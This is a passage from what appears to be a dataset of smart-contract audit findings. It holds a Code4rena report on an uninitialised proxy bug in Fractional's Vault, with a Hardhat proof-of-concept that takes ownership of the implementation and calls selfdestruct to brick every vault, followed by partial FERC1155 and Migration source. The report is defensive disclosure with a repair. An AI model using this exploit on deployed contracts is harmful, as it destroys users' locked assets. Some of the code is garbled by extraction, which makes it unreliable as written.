                    "javascript\nconst { ethers } = require(\"hardhat\");\n\nconst ZERO_ADDRESS = \"0x0000000000000000000000000000000000000000\";\n\nasync function main() {\n    const deployer, attacker] = await ethers.getSigners();\n\n    // Get all contract factories\n    const BaseVault = await ethers.getContractFactory(\"BaseVault\");\n    const Supply = await ethers.getContractFactory(\"Supply\");\n    const VaultRegistry = await ethers.getContractFactory(\"VaultRegistry\");\n\n    // Deploy contracts\n\n    const registry = await VaultRegistry.deploy();\n    await registry.deployed();\n\n    const supply = await Supply.deploy(registry.address);\n    await supply.deployed();\n\n    // notice that the `factory` var in the original `deploy.js` file is a different factory than the registry's\n    const registryVaultFactory = await ethers.getContractAt(\"VaultFactory\", await registry.factory());\n\n    const implVaultAddress = await registryVaultFactory.implementation();\n    const vaultImpl = await ethers.getContractAt(\"Vault\", implVaultAddress);\n\n    const baseVault = await BaseVault.deploy(registry.address, supply.address);\n    await baseVault.deployed();\n    // proxy vault the vault that's used by the user\n    let proxyVault = await deployVault(baseVault, registry, attacker);\n\n    const destructorFactory = await ethers.getContractFactory(\"Destructor\");\n    const destructor = await destructorFactory.deploy();\n\n\n    let destructData = destructor.interface.encodeFunctionData(\"destruct\", attacker.address]);\n\n    const abi = new ethers.utils.AbiCoder();\n    const leafData = abi.encode([\"address\", \"address\", \"bytes4\"],\n        attacker.address, destructor.address, destructor.interface.getSighash(\"destruct\")]);\n    const leafHash = ethers.utils.keccak256(leafData);\n\n    await vaultImpl.connect(attacker).init();\n\n    await vaultImpl.connect(attacker).setMerkleRoot(leafHash);\n    // we don't really need to do this ownership-transfer, because the contract is still usable till the end of the tx, but I'm doing it just in case\n    await vaultImpl.connect(attacker).transferOwnership(ZERO_ADDRESS);\n\n    // before: everything is fine\n    let implVaultCode = await ethers.provider.getCode(implVaultAddress);\n    console.log(\"Impl Vault code size before:\", implVaultCode.length 2); // -2 for the 0x prefix\n    let owner = await proxyVault.owner();\n    console.log(\"Proxy Vault works fine, owner is: \", owner);\n\n\n    await vaultImpl.connect(attacker).execute(destructor.address, destructData, ]);\n\n\n    // after: vault implementation is destructed\n    implVaultCode = await ethers.provider.getCode(implVaultAddress);\n    console.log(\"nVault code size after:\", implVaultCode.length 2); // -2 for the 0x prefix\n\n    try {\n        owner = await proxyVault.owner();\n    } catch (e) {\n        console.log(\"Proxy Vault isn't working anymore.\", e.toString().substring(0, 300));\n    }\n}\n\nasync function deployVault(baseVault, registry, attacker) {\n    const nodes = await baseVault.getLeafNodes();\n\n    const tx = await registry.connect(attacker).create(nodes[0], ], ]);\n    const receipt = await tx.wait();\n\n    const vaultEvent = receipt.events.find(e = e.address == registry.address);\n\n    const newVaultAddress = vaultEvent.args._vault;\n    const newVault = await ethers.getContractAt(\"Vault\", newVaultAddress);\n    return newVault;\n}\n\n\nif (require.main === module) {\n    main()\n}\n",
                    "//solidity\n// SPDX-License-Identifier: MIT\npragma //solidity 0.8.13;\n\ncontract Destructor{\n    function destruct(address payable dst) public {\n        selfdestruct(dst);\n    }\n}\n"
                ],
                "Type": " Vault implementation can be destroyed leading to loss of all assets",
                "Description": "\n<https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/VaultFactory.sol#L19-L22\n\n<https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/Vault.sol#L11-L25\n\n\nThis is a basic uninitialized proxy bug, the VaultFactory creates a single implementation of Vault and then creates a proxy to that implementation every time a new vault needs to be deployed.\n\nThe problem is that that implementation vault is not initialized , which means that anybody can initialize the contract to become the owner, and then destroy it by doing a delegate call (via the execute function) to a function with the selfdestruct opcode.\nOnce the implementation is destroyed all of the vaults will be unusable. And since there's no logic in the proxies to update the implementation that means this is permanent (i.e. there's no way to call any function on any vault anymore, they're simply dead).\n\n\nThis is a critical bug, since ALL assets held by ALL vaults will be lost. There's no way to transfer them out and there's no way to run any function on any vault.\n\nAlso, there's no way to fix the current deployed contracts (modules and registry), since they all depend on the factory vault, and there's no way to update them to a different factory. That means Fractional would have to deploy a new set of contracts after fixing the bug (this is a relatively small issue though).\n\n\nI created the PoC based on the scripts/deploy.js file, here's a stripped-down version of that:\n\njavascript\nconst { ethers } = require(\"hardhat\");\n\nconst ZERO_ADDRESS = \"0x0000000000000000000000000000000000000000\";\n\nasync function main() {\n    const deployer, attacker] = await ethers.getSigners();\n\n    // Get all contract factories\n    const BaseVault = await ethers.getContractFactory(\"BaseVault\");\n    const Supply = await ethers.getContractFactory(\"Supply\");\n    const VaultRegistry = await ethers.getContractFactory(\"VaultRegistry\");\n\n    // Deploy contracts\n\n    const registry = await VaultRegistry.deploy();\n    await registry.deployed();\n\n    const supply = await Supply.deploy(registry.address);\n    await supply.deployed();\n\n    // notice that the factory var in the original deploy.js file is a different factory than the registry's\n    const registryVaultFactory = await ethers.getContractAt(\"VaultFactory\", await registry.factory());\n\n    const implVaultAddress = await registryVaultFactory.implementation();\n    const vaultImpl = await ethers.getContractAt(\"Vault\", implVaultAddress);\n\n    const baseVault = await BaseVault.deploy(registry.address, supply.address);\n    await baseVault.deployed();\n    // proxy vault the vault that's used by the user\n    let proxyVault = await deployVault(baseVault, registry, attacker);\n\n    const destructorFactory = await ethers.getContractFactory(\"Destructor\");\n    const destructor = await destructorFactory.deploy();\n\n\n    let destructData = destructor.interface.encodeFunctionData(\"destruct\", attacker.address]);\n\n    const abi = new ethers.utils.AbiCoder();\n    const leafData = abi.encode([\"address\", \"address\", \"bytes4\"],\n        attacker.address, destructor.address, destructor.interface.getSighash(\"destruct\")]);\n    const leafHash = ethers.utils.keccak256(leafData);\n\n    await vaultImpl.connect(attacker).init();\n\n    await vaultImpl.connect(attacker).setMerkleRoot(leafHash);\n    // we don't really need to do this ownership-transfer, because the contract is still usable till the end of the tx, but I'm doing it just in case\n    await vaultImpl.connect(attacker).transferOwnership(ZERO_ADDRESS);\n\n    // before: everything is fine\n    let implVaultCode = await ethers.provider.getCode(implVaultAddress);\n    console.log(\"Impl Vault code size before:\", implVaultCode.length 2); // -2 for the 0x prefix\n    let owner = await proxyVault.owner();\n    console.log(\"Proxy Vault works fine, owner is: \", owner);\n\n\n    await vaultImpl.connect(attacker).execute(destructor.address, destructData, ]);\n\n\n    // after: vault implementation is destructed\n    implVaultCode = await ethers.provider.getCode(implVaultAddress);\n    console.log(\"nVault code size after:\", implVaultCode.length 2); // -2 for the 0x prefix\n\n    try {\n        owner = await proxyVault.owner();\n    } catch (e) {\n        console.log(\"Proxy Vault isn't working anymore.\", e.toString().substring(0, 300));\n    }\n}\n\nasync function deployVault(baseVault, registry, attacker) {\n    const nodes = await baseVault.getLeafNodes();\n\n    const tx = await registry.connect(attacker).create(nodes[0], ], ]);\n    const receipt = await tx.wait();\n\n    const vaultEvent = receipt.events.find(e = e.address == registry.address);\n\n    const newVaultAddress = vaultEvent.args._vault;\n    const newVault = await ethers.getContractAt(\"Vault\", newVaultAddress);\n    return newVault;\n}\n\n\nif (require.main === module) {\n    main()\n}\n\n\nDestructor.sol file:\n\nsolidity\n// SPDX-License-Identifier: MIT\npragma solidity 0.8.13;\n\ncontract Destructor{\n    function destruct(address payable dst) public {\n        selfdestruct(dst);\n    }\n}\n\n\nOutput:\n\n    Impl Vault code size before: 10386\n    Proxy Vault works fine, owner is:  0x5FbDB2315678afecb367f032d93F642f64180aa3\n\n    Vault code size after: 0\n    Proxy Vault isn't working anymore. Error: call revert exception  See: https://links.ethers.org/v5-errors-CALL_EXCEPTION ] (method=\"owner()\", data=\"0x\", errorArgs=null, errorName=null, errorSignature=null, reason=null, code=CALL_EXCEPTION, version=abi/5.6.2)\n\nSidenote: as the comment in the code says, we don't really need to transfer the ownership to the zero address.\nIt's just that Foundry's forge did revert the destruction when I didn't do it, with the error of OwnerChanged (i.e. once the selfdestruct was called the owner became the zero address, which is different than the original owner) so I decided to add this just in case.\nThis is probably a bug in forge, since the contract shouldn't destruct till the end of the tx (Hardhat indeed didn't revert the destruction even when the attacker was the owner).\n\n\nHardhat\n\n",
                "Repair": "\nAdd init in Vault's constructor (and make the init function public instead of external):\n\nsolidity\ncontract Vault is IVault, NFTReceiver {\n    /// @notice Address of vault owner\n    address public owner;\n    /// ...\n\n    constructor(){\n        // initialize implementation\n        init();\n    }\n\n    /// @dev Initializes nonce and proxy owner\n    function init() public {\n\n\n\nAlternately you can add init in VaultFactory.sol constructor, but I think initializing in the contract itself is a better practice.\n\nsolidity\n    /// @notice Initializes implementation contract\n    constructor() {\n        implementation = address(new Vault());\n        Vault(implementation).init();\n    }\n\n\n\nAfter mitigation the PoC will output this:\n\n    Error: VM Exception while processing transaction: reverted with custom error 'Initialized(\"0xa16E02E87b7454126E5E10d957A927A7F5B5d2be\", \"0x70997970C51812dc3A010C7d01b50e0d17dc79C8\", 1)'\n        at Vault._execute (src/Vault.sol:124)\n        at Vault.init (src/Vault.sol:24)\n        at HardhatNode._mineBlockWithPendingTxs\n        ....\n\nstevennevins (Fractional) confirmed and commented(https://github.com/code-423n4/2022-07-fractional-findings/issues/200#issuecomment-1189171679):\n  Acknowledging the severity of this and will fix it. Thank you for reporting @0xA5DF.\n\nHardlyDifficult (judge) commented(https://github.com/code-423n4/2022-07-fractional-findings/issues/200#issuecomment-1195541158):\n  Agree this is High risk. If this had gone unnoticed for a period of time, then later self destructing the implementation contract would brick all vaults and lose funds for potentially many users.\n\n*\n\n\n"
            }
        ]
    },
    {
        "Code": "// SPDX-License-Identifier: MIT\npragma solidity 0.8.13;\n\nimport {Clone} from \"clones-with-immutable-args/src/Clone.sol\";\nimport {ERC1155} from \"@rari-capital/solmate/src/tokens/ERC1155.sol\";\nimport {IFERC1155} from \"./interfaces/IFERC1155.sol\";\nimport {INFTReceiver} from \"./interfaces/INFTReceiver.sol\";\nimport \"./constants/Permit.sol\";\n\n/// @title FERC1155\n/// @author Fractional Art\n/// @notice An ERC-1155 implementation for Fractions\ncontract FERC1155 is Clone, ERC1155, IFERC1155 {\n    /// @notice Name of the token contract\n    string public constant NAME = \"FERC1155\";\n    /// @notice Version number of the token contract\n    string public constant VERSION = \"1\";\n    /// @notice Address that can deploy new vaults for this collection, manage metadata, etc\n    address internal _controller;\n    /// @notice URI of contract metadata\n    string public contractURI;\n    /// @notice Mapping of token type approvals owner => operator => tokenId => approved\n    mapping(address => mapping(address => mapping(uint256 => bool)))\n        public isApproved;\n    /// @notice Mapping of metadata contracts for token ID types => metadata address\n    mapping(uint256 => address) public metadata;\n    /// @notice Mapping to track account nonces for metadata txs owner => nonces\n    mapping(address => uint256) public nonces;\n    /// @notice Mapping to track total supply for token ID types => totalSupply\n    mapping(uint256 => uint256) public totalSupply;\n    /// @notice Mapping to track royalty receivers for token ID types => royaltyAddress\n    mapping(uint256 => address) private royaltyAddress;\n    /// @notice Mapping to track the royalty percent for token ID types => royaltyPercent\n    mapping(uint256 => uint256) private royaltyPercent;\n\n    /// @notice Modifier for restricting function calls to the controller account\n    modifier onlyController() {\n        address controller_ = controller();\n        if (msg.sender != controller_)\n            revert InvalidSender(controller_, msg.sender);\n        _;\n    }\n\n    /// @notice Modifier for restricting function calls to the VaultRegistry\n    modifier onlyRegistry() {\n        address vaultRegistry = VAULT_REGISTRY();\n        if (msg.sender != vaultRegistry)\n            revert InvalidSender(vaultRegistry, msg.sender);\n        _;\n    }\n\n    /// @notice Burns fractions for an ID\n    /// @param _from Address to burn fraction tokens from\n    /// @param _id Token ID to burn\n    /// @param _amount Number of tokens to burn\n    function burn(\n        address _from,\n        uint256 _id,\n        uint256 _amount\n    ) external onlyRegistry {\n        _burn(_from, _id, _amount);\n        totalSupply[_id] -= _amount;\n    }\n\n    /// @notice Hook to emit the URI update when setting the metadata or updating\n    /// @param _id Token ID metadata was updated for\n    /// @param _uri URI of metadata\n    function emitSetURI(uint256 _id, string memory _uri) external {\n        if (msg.sender != metadata[_id])\n            revert InvalidSender(metadata[_id], msg.sender);\n        emit URI(_uri, _id);\n    }\n\n    /// @notice Mints new fractions for an ID\n    /// @param _to Address to mint fraction tokens to\n    /// @param _id Token ID to mint\n    /// @param _amount Number of tokens to mint\n    /// @param _data Extra calldata to include in the mint\n    function mint(\n        address _to,\n        uint256 _id,\n        uint256 _amount,\n        bytes memory _data\n    ) external onlyRegistry {\n        _mint(_to, _id, _amount, _data);\n        totalSupply[_id] += _amount;\n    }\n\n    /// @notice Permit function that approves an operator for token type with a valid signature\n    /// @param _owner Address of the owner of the token type\n    /// @param _operator Address of the spender of the token type\n    /// @param _id ID of the token type\n    /// @param _approved Approval status for the token type\n    /// @param _deadline Expiration of the signature\n    /// @param _v The recovery ID (129th byte and chain ID) of the signature used to recover the signer\n    /// @param _r The first 64 bytes of the signature\n    /// @param _s Bytes 64-128 of the signature\n    function permit(\n        address _owner,\n        address _operator,\n        uint256 _id,\n        bool _approved,\n        uint256 _deadline,\n        uint8 _v,\n        bytes32 _r,\n        bytes32 _s\n    ) external {\n        if (block.timestamp > _deadline)\n            revert SignatureExpired(block.timestamp, _deadline);\n\n        // cannot realistically overflow on human timescales\n        unchecked {\n            bytes32 structHash = _computePermitStructHash(\n                _owner,\n                _operator,\n                _id,\n                _approved,\n                _deadline\n            );\n\n            bytes32 digest = _computeDigest(\n                _computeDomainSeparator(),\n                structHash\n            );\n\n            address signer = ecrecover(digest, _v, _r, _s);\n\n            if (signer == address(0) || signer != _owner)\n                revert InvalidSignature(signer, _owner);\n        }\n\n        isApproved[_owner][_operator][_id] = _approved;\n\n        emit SingleApproval(_owner, _operator, _id, _approved);\n    }\n\n    /// @notice Permit function that approves an operator for all token types with a valid signature\n    /// @param _owner Address of the owner of the token type\n    /// @param _operator Address of the spender of the token type\n    /// @param _approved Approval status for the token type\n    /// @param _deadline Expiration of the signature\n    /// @param _v The recovery ID (129th byte and chain ID) of the signature used to recover the signer\n    /// @param _r The first 64 bytes of the signature\n    /// @param _s Bytes 64-128 of the signature\n    function permitAll(\n        address _owner,\n        address _operator,\n        bool _approved,\n        uint256 _deadline,\n        uint8 _v,\n        bytes32 _r,\n        bytes32 _s\n    ) external {\n        if (block.timestamp > _deadline)\n            revert SignatureExpired(block.timestamp, _deadline);\n\n        // cannot realistically overflow on human timescales\n        unchecked {\n            bytes32 structHash = _computePermitAllStructHash(\n                _owner,\n                _operator,\n                _approved,\n                _deadline\n            );\n\n            bytes32 digest = _computeDigest(\n                _computeDomainSeparator(),\n                structHash\n            );\n\n            address signer = ecrecover(digest, _v, _r, _s);\n\n            if (signer == address(0) || signer != _owner)\n                revert InvalidSignature(signer, _owner);\n        }\n\n        isApprovedForAll[_owner][_operator] = _approved;\n\n        emit ApprovalForAll(_owner, _operator, _approved);\n    }\n\n    /// @notice Scoped approvals allow us to eliminate some of the risks associated with setting the approval for an entire collection\n    /// @param _operator Address of spender account\n    /// @param _id ID of the token type\n    /// @param _approved Approval status for operator(spender) account\n    function setApprovalFor(\n        address _operator,\n        uint256 _id,\n        bool _approved\n    ) external {\n        isApproved[msg.sender][_operator][_id] = _approved;\n\n        emit SingleApproval(msg.sender, _operator, _id, _approved);\n    }\n\n    /// @notice Sets the contract metadata\n    /// @param _uri URI of metadata\n    function setContractURI(string calldata _uri) external onlyController {\n        contractURI = _uri;\n    }\n\n    /// @notice Sets the token metadata contract\n    /// @param _metadata Address for metadata contract\n    /// @param _id Token ID to set the metadata for\n    function setMetadata(address _metadata, uint256 _id)\n        external\n        onlyController\n    {\n        metadata[_id] = _metadata;\n        emit SetMetadata(_metadata, _id);\n    }\n\n    /// @notice Sets the token royalties\n    /// @param _id Token ID royalties are being updated for\n    /// @param _receiver Address to receive royalties\n    /// @param _percentage Percentage of royalties on secondary sales\n    function setRoyalties(\n        uint256 _id,\n        address _receiver,\n        uint256 _percentage\n    ) external onlyController {\n        royaltyAddress[_id] = _receiver;\n        royaltyPercent[_id] = _percentage;\n        emit SetRoyalty(_receiver, _id, _percentage);\n    }\n\n    /// @notice Updates the controller address for the FERC1155 token contract\n    /// @param _newController Address of new controlling entity\n    function transferController(address _newController)\n        external\n        onlyController\n    {\n        if (_newController == address(0)) revert ZeroAddress();\n        _controller = _newController;\n        emit ControllerTransferred(_newController);\n    }\n\n    /// @notice Sets the token royalties\n    /// @param _id Token ID royalties are being updated for\n    /// @param _salePrice Sale price to calculate the royalty for\n    function royaltyInfo(uint256 _id, uint256 _salePrice)\n        external\n        view\n        returns (address receiver, uint256 royaltyAmount)\n    {\n        receiver = royaltyAddress[_id];\n        royaltyAmount = (_salePrice * royaltyPercent[_id]) / 100;\n    }\n\n    /// @notice Transfer an amount of a token type between two accounts\n    /// @param _from Source address for an amount of tokens\n    /// @param _to Destination address for an amount of tokens\n    /// @param _id ID of the token type\n    /// @param _amount The amount of tokens being transferred\n    /// @param _data Additional calldata\n    function safeTransferFrom(\n        address _from,\n        address _to,\n        uint256 _id,\n        uint256 _amount,\n        bytes memory _data\n    ) public override(ERC1155, IFERC1155) {\n        require(\n            msg.sender == _from ||\n                isApprovedForAll[_from][msg.sender] ||\n                isApproved[_from][msg.sender][_id],\n            \"NOT_AUTHORIZED\"\n        );\n\n        balanceOf[_from][_id] -= _amount;\n        balanceOf[_to][_id] += _amount;\n\n        emit TransferSingle(msg.sender, _from, _to, _id, _amount);\n\n        require(\n            _to.code.length == 0\n                ? _to != address(0)\n                : INFTReceiver(_to).onERC1155Received(\n                    msg.sender,\n                    _from,\n                    _id,\n                    _amount,\n                    _data\n                ) == INFTReceiver.onERC1155Received.selector,\n            \"UNSAFE_RECIPIENT\"\n        );\n    }\n\n    /// @notice Getter for URI of a token type\n    /// @param _id ID of the token type\n    function uri(uint256 _id)\n        public\n        view\n        override(ERC1155, IFERC1155)\n        returns (string memory)\n    {\n        require(metadata[_id] != address(0), \"NO METADATA\");\n        return IFERC1155(metadata[_id]).uri(_id);\n    }\n\n    /// @notice Getter for controller account\n    function controller() public view returns (address controllerAddress) {\n        _controller == address(0)\n            ? controllerAddress = INITIAL_CONTROLLER()\n            : controllerAddress = _controller;\n    }\n\n    /// @notice Getter for initial controller account immutable argument stored in calldata\n    function INITIAL_CONTROLLER() public pure returns (address) {\n        return _getArgAddress(0);\n    }\n\n    /// @notice VaultRegistry address that is allowed to call mint() and burn()\n    function VAULT_REGISTRY() public pure returns (address) {\n        return _getArgAddress(20);\n    }\n\n    /// @dev Computes hash of permit struct\n    /// @param _owner Address of the owner of the token type\n    /// @param _operator Address of the spender of the token type\n    /// @param _id ID of the token type\n    /// @param _approved Approval status for the token type\n    /// @param _deadline Expiration of the signature\n    function _computePermitStructHash(\n        address _owner,\n        address _operator,\n        uint256 _id,\n        bool _approved,\n        uint256 _deadline\n    ) internal returns (bytes32) {\n        return\n            keccak256(\n                abi.encode(\n                    PERMIT_TYPEHASH,\n                    _owner,\n                    _operator,\n                    _id,\n                    _approved,\n                    nonces[_owner]++,\n                    _deadline\n                )\n            );\n    }\n\n    /// @dev Computes hash of permit all struct\n    /// @param _owner Address of the owner of the token type\n    /// @param _operator Address of the spender of the token type\n    /// @param _approved Approval status for the token type\n    /// @param _deadline Expiration of the signature\n    function _computePermitAllStructHash(\n        address _owner,\n        address _operator,\n        bool _approved,\n        uint256 _deadline\n    ) internal returns (bytes32) {\n        return\n            keccak256(\n                abi.encode(\n                    PERMIT_ALL_TYPEHASH,\n                    _owner,\n                    _operator,\n                    _approved,\n                    nonces[_owner]++,\n                    _deadline\n                )\n            );\n    }\n\n    /// @dev Computes domain separator to prevent signature collisions\n    /// @return Hash of the contract-specific fields\n    function _computeDomainSeparator() internal view returns (bytes32) {\n        return\n            keccak256(\n                abi.encode(\n                    DOMAIN_TYPEHASH,\n                    keccak256(bytes(NAME)),\n                    keccak256(bytes(VERSION)),\n                    block.chainid,\n                    address(this)\n                )\n            );\n    }\n\n    /// @dev Computes digest of domain separator and struct hash\n    /// @param _domainSeparator Hash of contract-specific fields\n    /// @param _structHash Hash of signature fields struct\n    /// @return Hash of the signature digest\n    function _computeDigest(bytes32 _domainSeparator, bytes32 _structHash)\n        internal\n        pure\n        returns (bytes32)\n    {\n        return\n            keccak256(\n                abi.encodePacked(\"\\x19\\x01\", _domainSeparator, _structHash)\n            );\n    }\n}\n\n\n// SPDX-License-Identifier: Unlicense\npragma solidity 0.8.13;\n\nimport {IBuyout, Auction, State} from \"../interfaces/IBuyout.sol\";\nimport {IERC20} from \"../interfaces/IERC20.sol\";\nimport {IERC721} from \"../interfaces/IERC721.sol\";\nimport {IERC1155} from \"../interfaces/IERC1155.sol\";\nimport {IFERC1155} from \"../interfaces/IFERC1155.sol\";\nimport {IMigration, Proposal} from \"../interfaces/IMigration.sol\";\nimport {IModule} from \"../interfaces/IModule.sol\";\nimport {IVault} from \"../interfaces/IVault.sol\";\nimport {IVaultRegistry, Permission} from \"../interfaces/IVaultRegistry.sol\";\nimport {MerkleBase} from \"../utils/MerkleBase.sol\";\nimport {Minter} from \"./Minter.sol\";\nimport {Multicall} from \"../utils/Multicall.sol\";\nimport {NFTReceiver} from \"../utils/NFTReceiver.sol\";\nimport {ReentrancyGuard} from \"@rari-capital/solmate/src/utils/ReentrancyGuard.sol\";\n\n/// @title Migration\n/// @author Fractional Art\n/// @notice Module contract for vaults to migrate to a new set of permissions\n/// - A fractional holder creates a proposal with a target price and list of modules\n/// - For 7 days, users can contribute their fractions / ether to signal support\n/// - If the target price is reached then a buyout can be triggered and trading\n///   against the proposed buyout price can take place to resolve the outcome\n/// - If a proposal holds more than 51% of the total supply, the buyout succeeds, a new vault can\n///   be created and the underlying assets (ERC-20, ERC-721 and ERC-1155 tokens) can be migrated\ncontract Migration is\n    IMigration,\n    MerkleBase,\n    Minter,\n    Multicall,\n    NFTReceiver,\n    ReentrancyGuard\n{\n    /// @notice Address of Buyout module contract\n    address payable public buyout;\n    /// @notice Address of VaultRegistry contract\n    address public registry;\n    /// @notice Counter used to assign IDs to new proposals\n    uint256 public nextId;\n    /// @notice The length for the migration proposal period\n    uint256 public constant PROPOSAL_PERIOD = 7 days;\n    /// @notice Mapping of a vault to it's proposal migration information\n    mapping(address => mapping(uint256 => Proposal)) public migrationInfo;\n    /// @notice Mapping of a proposal ID to a user's ether contribution\n    mapping(uint256 => mapping(address => uint256)) private userProposalEth;\n    /// @notice Mapping of a proposal ID to a user's fractions contribution\n    mapping(uint256 => mapping(address => uint256))\n        private userProposalFractions;\n\n    /// @notice Initializes buyout, registry, and supply contracts\n    constructor(\n        address _buyout,\n        address _registry,\n        address _supply\n    ) Minter(_supply) {\n        buyout = payable(_buyout);\n        registry = _registry;\n    }\n\n    /// @dev Callback for receiving ether when the calldata is empty\n    receive() external payable {}\n\n    /// @notice Proposes a set of modules and plugins to migrate a vault to\n    /// @param _vault Address of the vault\n    /// @param _modules Addresses of module contracts\n    /// @param _plugins Addresses of plugin contracts\n    /// @param _selectors List of plugin function selectors\n    /// @param _newFractionSupply New supply of fractional tokens\n    /// @param _targetPrice Target price of the buyout\n    function propose(\n        address _vault,\n        address[] calldata _modules,\n        address[] calldata _plugins,\n        bytes4[] calldata _selectors,\n        uint256 _newFractionSupply,\n        uint256 _targetPrice\n    ) external {\n        // Reverts if address is not a registered vault\n        (, uint256 id) = IVaultRegistry(registry).vaultToToken(_vault);\n        if (id == 0) revert NotVault(_vault);\n        // Reverts if buyout state is not inactive\n        (, , State current, , , ) = IBuyout(buyout).buyoutInfo(_vault);\n        State required = State.INACTIVE;\n        if (current != required) revert IBuyout.InvalidState(required, current);\n\n        // Initializes migration proposal info\n        Proposal storage proposal = migrationInfo[_vault][++nextId];\n        proposal.startTime = block.timestamp;\n        proposal.targetPrice = _targetPrice;\n        proposal.modules = _modules;\n        proposal.plugins = _plugins;\n        proposal.selectors = _selectors;\n        proposal.oldFractionSupply = IVaultRegistry(registry).totalSupply(\n            _vault\n        );\n        proposal.newFractionSupply = _newFractionSupply;\n    }\n\n    /// @notice Joins a migration proposal by contributing ether and fractional tokens\n    /// @param _vault The address of the vault\n    /// @param _proposalId ID of the proposal being contributed to\n    /// @param _amount Number of fractions being contributed\n    function join(\n        address _vault,\n        uint256 _proposalId,\n        uint256 _amount\n    ) external payable nonReentrant {\n        // Reverts if address is not a registered vault\n        (address token, uint256 id) = IVaultRegistry(registry).vaultToToken(\n            _vault\n        );\n        if (id == 0) revert NotVault(_vault);\n        // Reverts if buyout state is not inactive\n        (, , State current, , , ) = IBuyout(buyout).buyoutInfo(_vault);\n        State required = State.INACTIVE;\n        if (current != required) revert IBuyout.InvalidState(required, current);\n\n        // Gets the migration proposal for the given ID\n        Proposal storage proposal = migrationInfo[_vault][_proposalId];\n        // Updates ether balances of the proposal and caller\n        proposal.totalEth += msg.value;\n        userProposalEth[_proposalId][msg.sender] += msg.value;\n        // Deposits fractional tokens into contract\n        IFERC1155(token).safeTransferFrom(\n            msg.sender,\n            address(this),\n            id,\n            _amount,\n            \"\"\n        );\n        // Updates fraction balances of the proposal and caller\n        proposal.totalFractions += _amount;\n        userProposalFractions[_proposalId][msg.sender] += _amount;\n    }\n\n    /// @notice Leaves a proposed migration with contribution amount\n    /// @param _vault Address of the vault\n    /// @param _proposalId ID of the proposal being left\n    function leave(address _vault, uint256 _proposalId) external {\n        // Reverts if address is not a registered vault\n        (address token, uint256 id) = IVaultRegistry(registry).vaultToToken(\n            _vault\n        );\n        if (id == 0) revert NotVault(_vault);\n        // Reverts if buyout state is not inactive\n        (, , State current, , , ) = IBuyout(buyout).buyoutInfo(_vault);\n        State required = State.INACTIVE;\n        if (current != required) revert IBuyout.InvalidState(required, current);\n\n        // Gets the migration proposal for the given ID\n        Proposal storage proposal = migrationInfo[_vault][_proposalId];\n        // Updates fraction balances of the proposal and caller\n        uint256 amount = userProposalFractions[_proposalId][msg.sender];\n        proposal.totalFractions -= amount;\n        userProposalFractions[_proposalId][msg.sender] = 0;\n        // Updates ether balances of the proposal and caller\n        uint256 ethAmount = userProposalEth[_proposalId][msg.sender];\n        proposal.totalEth -= ethAmount;\n        userProposalEth[_proposalId][msg.sender] = 0;\n\n        // Withdraws fractions from contract back to caller\n        IFERC1155(token).safeTransferFrom(\n            address(this),\n            msg.sender,\n            id,\n            amount,\n            \"\"\n        );\n        // Withdraws ether from contract back to caller\n        payable(msg.sender).transfer(ethAmount);\n    }\n\n    /// @notice Kicks off the buyout process for a migration\n    /// @param _vault Address of the vault\n    /// @param _proposalId ID of the proposal being committed to\n    /// @return started Bool status of starting the buyout process\n    function commit(address _vault, uint256 _proposalId)\n        external\n        returns (bool started)\n    {\n        // Reverts if address is not a registered vault\n        (address token, uint256 id) = IVaultRegistry(registry).vaultToToken(\n            _vault\n        );\n        if (id == 0) revert NotVault(_vault);\n        // Reverts if buyout state is not inactive\n        (, , State current, , , ) = IBuyout(buyout).buyoutInfo(_vault);\n        State required = State.INACTIVE;\n        if (current != required) revert IBuyout.InvalidState(required, current);\n        // Reverts if migration is passed proposal period\n        Proposal storage proposal = migrationInfo[_vault][_proposalId];\n        if (block.timestamp > proposal.startTime + PROPOSAL_PERIOD)\n            revert ProposalOver();\n\n        // Calculates current price of the proposal based on total supply\n        uint256 currentPrice = _calculateTotal(\n            100,\n            IVaultRegistry(registry).totalSupply(_vault),\n            proposal.totalEth,\n            proposal.totalFractions\n        );\n\n        // Checks if the current price is greater than target price of the proposal\n        if (currentPrice > proposal.targetPrice) {\n            // Sets token approval to the buyout contract\n            IFERC1155(token).setApprovalFor(address(buyout), id, true);\n            // Starts the buyout process\n            IBuyout(buyout).start{value: proposal.totalEth}(_vault);\n            proposal.isCommited = true;\n            started = true;\n        }\n    }\n\n    /// @notice Settles a migration by ending the buyout\n    /// @dev Succeeds if buyout goes through, fails otherwise\n    /// @param _vault Address of the vault\n    /// @param _proposalId ID of the proposal being settled\n    function settleVault(address _vault, uint256 _proposalId) external {\n        // Reverts if the migration was not proposed\n        Proposal storage proposal = migrationInfo[_vault][_proposalId];\n        if (!(proposal.isCommited)) revert NotProposed();\n        // Reverts if the migration was unsuccessful\n        (, , State current, , , ) = IBuyout(buyout).buyoutInfo(_vault);\n        if (current != State.SUCCESS) revert UnsuccessfulMigration();\n        // Reverts if the new vault has already been deployed\n        if (proposal.newVault != address(0))\n            revert NewVaultAlreadyDeployed(proposal.newVault);\n\n        // Gets the merkle root for the vault and given proposal ID\n        bytes32[] memory merkleTree = generateMerkleTree(proposal.modules);\n        bytes32 merkleRoot = getRoot(merkleTree);\n        // Deploys a new vault with set permissions and plugins\n        address newVault = IVaultRegistry(registry).create(\n            merkleRoot,\n            proposal.plugins,\n            proposal.selectors\n        );\n        // Sets address of the newly deployed vault\n        proposal.newVault = newVault;\n        // Emits event for settling the new vault\n        emit VaultMigrated(\n            _vault,\n            newVault,\n            _proposalId,\n            proposal.modules,\n            proposal.plugins,\n            proposal.selectors\n        );\n    }\n\n    /// @notice Mints the fractional tokens for a new vault\n    /// @param _vault Address of the vault\n    /// @param _proposalId ID of the proposal\n    /// @param _mintProof Merkle proof for minting fractional tokens\n    function settleFractions(\n        address _vault,\n        uint256 _proposalId,\n        bytes32[] calldata _mintProof\n    ) external {\n        // Reverts if the migration was unsuccessful\n        (, , State current, , , ) = IBuyout(buyout).buyoutInfo(_vault);\n        if (current != State.SUCCESS) revert UnsuccessfulMigration();\n        // Reverts if there is no new vault to migrate to\n        Proposal storage proposal = migrationInfo[_vault][_proposalId];\n        if (proposal.newVault == address(0)) revert NoVaultToMigrateTo();\n        // Reverts if fractions of the new vault have already been minted\n        if (proposal.fractionsMigrated) revert NewFractionsAlreadyMinted();\n\n        // Mints initial supply of fractions for the new vault\n        _mintFractions(\n            proposal.newVault,\n            address(this),\n            proposal.newFractionSupply,\n            _mintProof\n        );\n\n        